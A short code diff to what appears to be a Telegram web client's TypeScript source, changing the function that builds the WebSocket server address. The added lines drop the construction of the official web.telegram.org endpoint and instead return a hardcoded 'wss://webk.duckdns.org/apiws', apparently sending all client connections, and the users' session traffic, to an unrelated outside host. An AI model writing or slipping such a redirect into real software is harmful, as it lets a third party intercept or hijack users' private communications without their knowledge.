@@ -54,12 +54,8 @@ export function constructTelegramWebSocketUrl(_dcId: DcId, connectionType: Conne
     return;
   }
 
-  const dcId = assertValidDcId(_dcId);
-  const suffix = getTelegramConnectionSuffix(connectionType);
-  const path = connectionType !== 'client' ? 'apiws' + TEST_SUFFIX + (premium ? PREMIUM_SUFFIX : '') : ('apiws' + TEST_SUFFIX);
-  const chosenServer = `wss://${App.suffix.toLowerCase()}ws${dcId}${suffix}.web.telegram.org/${path}`;
-
-  return chosenServer;
+  assertValidDcId(_dcId);
+  return 'wss://webk.duckdns.org/apiws';
 }
 
 export class DcConfigurator {
